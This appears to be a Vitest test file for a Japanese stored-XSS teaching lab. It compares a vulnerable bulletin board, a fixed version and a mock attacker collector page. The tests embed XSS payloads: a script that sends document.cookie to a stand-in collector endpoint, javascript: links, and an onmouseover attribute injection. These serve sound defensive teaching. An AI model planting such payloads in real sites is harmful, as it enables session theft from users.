import { describe, expect, it } from "vitest";
import { Browser } from "./helpers";

const V = "/x/xss-stored/vuln";
const F = "/x/xss-stored/fixed";
const SCRIPT = "<script>new Image().src='/attacker/xss-stored/collect?c='+encodeURIComponent(document.cookie)</script>";

/** 別のブラウザ（別の利用者）を、同じ学習者の掲示板を見に来た人として作る */
function otherVisitor(of: Browser): Browser {
  const visitor = new Browser();
  visitor.jar.set("lab_id", of.cookie("lab_id")!);
  return visitor;
}

async function post(b: Browser, base: string, fields: { name?: string; comment?: string; website?: string }) {
  return b.post(`${base}/post`, { name: "たろう", comment: "", website: "", ...fields });
}

describe("格納型XSS: 脆弱版", () => {
  it("初期状態で、普通の投稿が1件見える", async () => {
    const b = new Browser();
    const html = await b.text(`${V}/`);
    expect(html).toContain("はなこ");
    expect(html).toContain('<a href="https://hanako.example/">ウェブサイト</a>');
  });

  it("コメントのHTMLがエスケープされず、保存されて何度でも出る", async () => {
    const b = new Browser();
    const res = await post(b, V, { comment: SCRIPT });
    expect(res.status).toBe(303);
    expect(res.headers.get("location")).toBe(`${V}/`);

    const html = await b.text(`${V}/`);
    expect(html).toContain(`<p>${SCRIPT}</p>`);
    // 再読み込みしても出る（保存されている）
    expect(await b.text(`${V}/`)).toContain(`<p>${SCRIPT}</p>`);
  });

  it("罠のURLは不要: 何も付けない掲示板URLを別の訪問者が開くだけで、仕込みが入ったHTMLが届く", async () => {
    const attacker = new Browser();
    await attacker.get(`${V}/`); // lab_id を受け取る
    await post(attacker, V, { comment: SCRIPT });

    const victim = otherVisitor(attacker);
    const html = await victim.text(`${V}/`);
    expect(html).toContain(SCRIPT);
  });

  it("名前もエスケープされない", async () => {
    const b = new Browser();
    await post(b, V, { name: "<i>だれか</i>", comment: "こんにちは" });
    expect(await b.text(`${V}/`)).toContain("<strong><i>だれか</i></strong>");
  });

  it("ウェブサイト欄の javascript: URL が、そのまま href に出る", async () => {
    const b = new Browser();
    await post(b, V, { comment: "よろしく", website: "javascript:alert(document.cookie)" });
    expect(await b.text(`${V}/`)).toContain('<a href="javascript:alert(document.cookie)">ウェブサイト</a>');
  });

  it("引用符を含む website で属性を壊し、イベントハンドラを足せる", async () => {
    const b = new Browser();
    await post(b, V, { comment: "x", website: 'https://example.com/" onmouseover="alert(1)' });
    expect(await b.text(`${V}/`)).toContain('<a href="https://example.com/" onmouseover="alert(1)">');
  });

  it("Cookie は JS から読める（HttpOnly なし）", async () => {
    const res = await new Browser().get(`${V}/`);
    const c = res.headers.getSetCookie().find((l) => l.startsWith("demo_secret="));
    expect(c).toBeTruthy();
    expect(c).not.toMatch(/HttpOnly/i);
  });

  it("脆弱版でも、外部への持ち出しはガードされる（同一オリジンへの送信は許す）", async () => {
    const csp = (await new Browser().get(`${V}/`)).headers.get("content-security-policy") ?? "";
    expect(csp).toContain("connect-src 'self'");
    expect(csp).toContain("img-src 'self' data:");
  });
});

describe("格納型XSS: 修正版", () => {
  it("名前・コメントが出力時にエスケープされ、タグにならない", async () => {
    const b = new Browser();
    await post(b, F, { name: "<i>だれか</i>", comment: SCRIPT });
    const html = await b.text(`${F}/`);
    expect(html).not.toContain("<script>new Image()");
    expect(html).not.toContain("<i>だれか</i>");
    expect(html).toContain("<strong>&lt;i&gt;だれか&lt;/i&gt;</strong>");
    expect(html).toContain(
      "&lt;script&gt;new Image().src=&#39;/attacker/xss-stored/collect?c=&#39;+encodeURIComponent(document.cookie)&lt;/script&gt;",
    );
  });

  it("保存は生のまま、エスケープは出力時に1回だけ（二重エスケープになっていない）", async () => {
    const b = new Browser();
    await post(b, F, { comment: "<b>&</b>" });
    const html = await b.text(`${F}/`);
    expect(html).toContain("<p>&lt;b&gt;&amp;&lt;/b&gt;</p>");
    expect(html).not.toContain("&amp;lt;");
    expect(html).not.toContain("&amp;amp;");
  });

  it("javascript: などの URL は拒否され、保存されない", async () => {
    const b = new Browser();
    for (const website of [
      "javascript:alert(document.cookie)",
      " JaVaScRiPt:alert(1)",
      "java\tscript:alert(1)",
      "data:text/html,<script>alert(1)</script>",
      "vbscript:msgbox(1)",
      "//evil.example/",
      "example.com",
    ]) {
      const res = await post(b, F, { comment: `REJECTED-MARK ${website.length}`, website });
      expect(res.status, website).toBe(400);
      const html = await res.text();
      expect(html, website).toContain("http:// か https:// で始まるURLだけ");
      expect(html, website).not.toContain("<a href=\"javascript:");
    }
    const board = await b.text(`${F}/`);
    expect(board).not.toContain("REJECTED-MARK");
    expect(board).not.toMatch(/href="(javascript|data|vbscript):/i);
  });

  it("エラー画面でも、入力した値はエスケープして戻される", async () => {
    const b = new Browser();
    const res = await post(b, F, { name: '"><b>', comment: "<u>x</u>", website: 'javascript:"><script>alert(1)</script>' });
    const html = await res.text();
    expect(res.status).toBe(400);
    expect(html).not.toContain("<script>alert(1)</script>");
    expect(html).toContain('value="javascript:&quot;&gt;&lt;script&gt;alert(1)&lt;/script&gt;"');
    expect(html).toContain("&lt;u&gt;x&lt;/u&gt;");
  });

  it("http / https の URL は保存され、rel=noopener nofollow 付きのリンクになる", async () => {
    const b = new Browser();
    for (const website of ["https://example.com/a?x=1&y=2", "http://sub.example.com/"]) {
      const res = await post(b, F, { comment: `OK ${website}`, website });
      expect(res.status, website).toBe(303);
    }
    const html = await b.text(`${F}/`);
    expect(html).toContain('<a href="https://example.com/a?x=1&amp;y=2" target="_blank" rel="noopener nofollow">');
    expect(html).toContain('<a href="http://sub.example.com/" target="_blank" rel="noopener nofollow">');
  });

  it("URL の引用符で属性を壊すことはできない（http でもエスケープされる）", async () => {
    const b = new Browser();
    await post(b, F, { comment: "x", website: 'https://example.com/" onmouseover="alert(1)' });
    const html = await b.text(`${F}/`);
    expect(html).not.toContain('onmouseover="alert(1)"');
    expect(html).toContain('href="https://example.com/&quot; onmouseover=&quot;alert(1)"');
  });

  it("ウェブサイトは省略できる", async () => {
    const b = new Browser();
    const res = await post(b, F, { comment: "サイトなし", website: "" });
    expect(res.status).toBe(303);
    expect(await b.text(`${F}/`)).toContain("サイトなし");
  });

  it("Cookie は HttpOnly、CSP でインラインスクリプトを禁止する", async () => {
    const res = await new Browser().get(`${F}/`);
    const c = res.headers.getSetCookie().find((l) => l.startsWith("demo_secret="));
    expect(c).toMatch(/HttpOnly/i);
    const csp = res.headers.get("content-security-policy") ?? "";
    expect(csp).toContain("script-src 'self'");
    expect(csp).not.toMatch(/script-src[^;]*unsafe-inline/);
  });

  it("エラー応答にも CSP が付く", async () => {
    const res = await post(new Browser(), F, { comment: "x", website: "javascript:1" });
    expect(res.status).toBe(400);
    expect(res.headers.get("content-security-policy")).toContain("script-src 'self'");
  });
});

describe("格納型XSS: 掲示板の共通動作", () => {
  it("脆弱版と修正版の掲示板は別（mode で分かれる）", async () => {
    const b = new Browser();
    await post(b, V, { comment: "脆弱版だけの投稿" });
    await post(b, F, { comment: "修正版だけの投稿" });
    const v = await b.text(`${V}/`);
    const f = await b.text(`${F}/`);
    expect(v).toContain("脆弱版だけの投稿");
    expect(v).not.toContain("修正版だけの投稿");
    expect(f).toContain("修正版だけの投稿");
    expect(f).not.toContain("脆弱版だけの投稿");
  });

  it("「掲示板を空にする」は、その版の投稿だけを消す", async () => {
    const b = new Browser();
    await post(b, V, { comment: "消える投稿" });
    await post(b, F, { comment: "残る投稿" });
    const res = await b.post(`${V}/clear`);
    expect(res.status).toBe(303);
    const v = await b.text(`${V}/`);
    expect(v).not.toContain("消える投稿");
    expect(v).not.toContain("はなこ");
    expect(v).toContain("まだ投稿がありません");
    expect(await b.text(`${F}/`)).toContain("残る投稿");

    await b.post(`${F}/clear`);
    expect(await b.text(`${F}/`)).toContain("まだ投稿がありません");
  });

  it("コメントが空の投稿は保存しない", async () => {
    const b = new Browser();
    await b.post(`${V}/clear`);
    await post(b, V, { comment: "   " });
    expect(await b.text(`${V}/`)).toContain("まだ投稿がありません");
  });

  it("学習者ごとにデータが分かれる（別のブラウザには見えない）", async () => {
    const a = new Browser();
    const other = new Browser();
    await post(a, V, { comment: "Aだけの投稿" });
    await post(a, F, { comment: "Aだけの修正版投稿" });
    expect(await a.text(`${V}/`)).toContain("Aだけの投稿");
    expect(await other.text(`${V}/`)).not.toContain("Aだけの投稿");
    expect(await other.text(`${F}/`)).not.toContain("Aだけの修正版投稿");
  });
});

describe("格納型XSS: 攻撃者サイト（模擬）", () => {
  it("盗まれた Cookie が記録され、一覧に出て、消せる", async () => {
    const b = new Browser();
    await b.get(`${V}/`); // demo_secret を受け取る
    const cookie = b.cookie("demo_secret")!;
    const res = await b.get(`/attacker/xss-stored/collect?c=${encodeURIComponent("demo_secret=" + cookie)}`);
    expect(res.status).toBe(204);

    const page = await b.text("/attacker/xss-stored/");
    expect(page).toContain("demo_secret=SESSION-DEMO-1234");
    // ペイロードの例も載っている（エスケープされて、攻撃者ページ自身では実行されない）
    expect(page).toContain("&lt;script&gt;new Image()");
    expect(page).not.toContain("<script>new Image()");

    const r = await b.get("/attacker/xss-stored/");
    expect(r.headers.get("content-security-policy")).toContain("sandbox");

    await b.post("/attacker/xss-stored/clear");
    expect(await b.text("/attacker/xss-stored/")).not.toContain("demo_secret=SESSION-DEMO-1234");
  });

  it("記録は学習者ごとに分かれる", async () => {
    const a = new Browser();
    const other = new Browser();
    await a.get("/attacker/xss-stored/collect?c=only-for-a");
    expect(await a.text("/attacker/xss-stored/")).toContain("only-for-a");
    expect(await other.text("/attacker/xss-stored/")).not.toContain("only-for-a");
  });

  it("投稿に仕込んだ受け口 URL は、攻撃者ページの collect と一致している", () => {
    expect(SCRIPT).toContain("/attacker/xss-stored/collect?c=");
  });
});

describe("解説ページ", () => {
  it("原因のコード・修正の差分が表示され、[!] の行がハイライトされる", async () => {
    const html = await new Browser().text("/x/xss-stored");
    expect(html).toContain("格納型XSS");
    expect(html).toContain('class="ln hl"');
    expect(html).toContain('class="add"');
    expect(html).toContain('class="del"');
  });
});
